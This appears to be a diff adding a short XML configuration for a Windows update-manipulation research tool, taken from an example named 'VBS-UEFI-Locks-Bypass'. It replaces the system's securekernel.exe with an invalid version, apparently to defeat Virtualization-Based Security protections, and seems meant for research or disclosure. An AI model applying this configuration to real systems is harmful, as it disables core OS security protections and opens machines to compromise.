@@ -1,0 +1,5 @@
+<Configuration>
+    <UpdateFilesList>
+        <UpdateFile source="%CWD%\examples\VBS-UEFI-Locks-Bypass\UpdateFiles\invalid_securekernel.exe" destination="C:\Windows\System32\securekernel.exe" />
+    </UpdateFilesList>
+</Configuration>
